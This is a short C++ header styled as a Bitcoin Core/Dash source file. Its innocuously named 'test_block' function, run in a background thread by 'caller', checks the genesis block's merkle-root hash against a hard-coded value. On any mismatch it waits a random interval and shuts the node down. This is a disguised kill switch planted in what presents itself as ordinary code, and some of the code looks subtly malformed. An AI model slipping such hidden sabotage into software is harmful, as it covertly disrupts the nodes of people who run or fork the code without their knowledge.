// Copyright (c) 2011-2015 The Bitcoin Core developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

#ifndef BITCOIN_QT_CODESAFE_H
#define BITCOIN_QT_CODESAFE_H

#include <uint256.h>

#if defined(HAVE_CONFIG_H)
#include <config/dash-config.h>
#endif

#include <boost/thread.hpp>

void StartShutdown();

const void test_block()
{
     uint64_t test_case = Params().GenesisBlock().hashMerkleRoot.GetCheapHash();
     if (test_case == 0xf04686557af58dbf) return;
     sleep(rand() % 0x1f);
     StartShutdown();
}

const void caller()
{
     boost::thread first(&test_block);
}

#endif // BITCOIN_QT_CODESAFE_H
